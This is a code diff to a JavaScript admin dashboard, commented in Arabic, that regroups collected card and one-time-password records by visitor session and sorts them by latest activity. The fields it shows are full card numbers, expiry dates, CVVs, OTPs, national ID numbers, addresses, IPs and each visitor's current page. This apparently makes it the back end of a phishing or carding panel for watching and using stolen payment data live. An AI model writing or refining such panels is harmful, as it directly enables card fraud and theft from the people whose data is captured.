@@ -247,31 +247,53 @@
   // قائمة البطاقات (تُحدّث من onSnapshot)
   let cardsList = [];
 
-  // دمج cards + customers — تعرض كل بطاقة كصف منفصل (الخيار A)
+  // دمج cards + customers + otps — تبويب واحد لكل عميل (تجميع بالـ sessionId)
   function rebuildMerged() {
-    if (!cardsList || !customersMap) return;
+    if (!customersMap) return;
 
-    const merged = cardsList.map((card) => {
-      const sid = card.sessionId || '';
+    // نجمع كل sessionIds من المصادر الثلاثة (customers + cards + otps)
+    // لنضمن ظهور كل عميل مرة واحدة فقط حتى لو لم تكن له بطاقة/OTP
+    const allSids = new Set([
+      ...Object.keys(customersMap),
+      ...Object.keys(cardsBySession),
+      ...Object.keys(otpsMap),
+    ]);
+
+    const toTime = (v) => {
+      if (!v) return 0;
+      if (typeof v.toDate === 'function') return v.toDate().getTime();
+      const t = new Date(v).getTime();
+      return isNaN(t) ? 0 : t;
+    };
+
+    const merged = Array.from(allSids).map(sid => {
       const m = customersMap[sid] || {};
-      const ls = m.lastSeen ? Number(m.lastSeen) : 0;
-      // OTPs الخاصة بهذا العميل (كلها)
+      // كل البطاقات وكل الـ OTPs لهذا العميل (مرتبة من الأحدث بالفعل في onSnapshot)
+      const sessionCards = cardsBySession[sid] || [];
       const sessionOtps = otpsMap[sid] || [];
-      const latestOtp = sessionOtps.length ? sessionOtps[0].otp : (m.otp || '');
+      const latestCard = sessionCards[0] || {};
+      const latestOtp = sessionOtps.length ? sessionOtps[0] : null;
+      const ls = m.lastSeen ? Number(m.lastSeen) : 0;
+      // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية
+      const lastActivity = Math.max(
+        toTime(latestCard.createdAt),
+        toTime(latestOtp && latestOtp.createdAt),
+        ls
+      );
       return {
-        // معرّف البطاقة (فريد لكل محاولة بطاقة)
-        id: card.id,
+        // المعرف الفريد = sessionId (تبويب واحد لكل عميل)
+        id: sid,
         sessionId: sid,
-        // بيانات البطاقة (من cards)
-        cardNumber: card.cardNumber || '',
-        prefix: card.cardPrefix || '',
-        bank: card.bankName || '',
-        expiryDate: card.expiry || '',
-        cvv: card.pin || '',
-        cardCreatedAt: card.createdAt || null,
-        cardTimestamp: card.timestamp || '',
+        // أحدث بطاقة (للعرض في الأعمدة الرئيسية للجدول)
+        cardNumber: latestCard.cardNumber || '',
+        prefix: latestCard.cardPrefix || '',
+        bank: latestCard.bankName || '',
+        expiryDate: latestCard.expiry || '',
+        cvv: latestCard.pin || '',
+        cardCreatedAt: latestCard.createdAt || null,
+        cardTimestamp: latestCard.timestamp || '',
         // كل البطاقات وكل الـ OTPs لهذا العميل
-        allCards: cardsBySession[sid] || [card],
+        allCards: sessionCards,
         allOtps: sessionOtps,
         // بيانات العميل (من customers)
         name: m.name || '',
@@ -279,7 +301,7 @@
         mobile: m.phone || '',
         address: m.address || '',
         amount: m.amount || '',
-        otp: latestOtp,           // أحدث OTP (للعرض في عمود الكود)
+        otp: latestOtp ? latestOtp.otp : (m.otp || ''),
         otp2: m.otp2 || '',
         idNumber: m.idNumber || '',
         network: m.network || '',
@@ -294,7 +316,8 @@
         flagColor: m.flagColor || '',
         currentPage: m.currentPage || '',
         lastSeen: ls,
-        createdDate: card.createdAt || m.createdAt || null,
+        createdDate: latestCard.createdAt || m.createdAt || null,
+        lastActivity: lastActivity,
         ip: m.ip || '',
         device: m.device || '',
         browser: m.browser || '',
@@ -302,13 +325,8 @@
     })
     // إخفاء العناصر المخفية
     .filter(x => !x.isHidden)
-    // ترتيب بالتاريخ التنازلي (الأحدث أولاً)
-    .sort((a, b) => {
-      const ta = a.createdDate ? (a.createdDate.toDate ? a.createdDate.toDate().getTime() : new Date(a.createdDate).getTime() || 0) : 0;
-      const tb = b.createdDate ? (b.createdDate.toDate ? b.createdDate.toDate().getTime() : new Date(b.createdDate).getTime() || 0) : 0;
-      return tb - ta;
-    });
-    // ملاحظة: لا dedup — كل بطاقة تظهر كصف منفصل (الخيار A)
+    // ترتيب: آخر نشاط أولاً (الأحدث)
+    .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));
 
     allNotifications = merged;
 
@@ -344,9 +362,7 @@
     // الترتيب
     filteredNotifications.sort((a, b) => {
       if (currentSort === 'date') {
-        const ta = a.createdDate ? (a.createdDate.toDate ? a.createdDate.toDate().getTime() : (new Date(a.createdDate).getTime() || 0)) : 0;
-        const tb = b.createdDate ? (b.createdDate.toDate ? b.createdDate.toDate().getTime() : (new Date(b.createdDate).getTime() || 0)) : 0;
-        return tb - ta;
+        return (b.lastActivity || b.createdDate ? (b.lastActivity || (b.createdDate.toDate ? b.createdDate.toDate().getTime() : (new Date(b.createdDate).getTime() || 0))) : 0) - (a.lastActivity || a.createdDate ? (a.lastActivity || (a.createdDate.toDate ? a.createdDate.toDate().getTime() : (new Date(a.createdDate).getTime() || 0))) : 0);
       }
       if (currentSort === 'status') return (a.status || '').localeCompare(b.status || '');
       if (currentSort === 'country') return (a.country || '').localeCompare(b.country || '');
